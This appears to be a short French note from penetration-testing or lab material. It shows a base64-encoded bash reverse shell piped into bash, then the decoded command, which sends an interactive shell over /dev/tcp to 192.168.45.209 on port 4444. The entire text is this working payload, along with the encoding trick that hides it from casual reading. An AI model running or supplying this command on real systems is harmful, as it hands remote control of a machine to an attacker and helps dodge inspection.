# Reverse shell encodé base64 :
```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwOS80NDQ0IDA+JjEK | base64 -d | bash

le reverse shell encodé est décodé :
bash -i >& /dev/tcp/192.168.45.209/4444 0>&1
```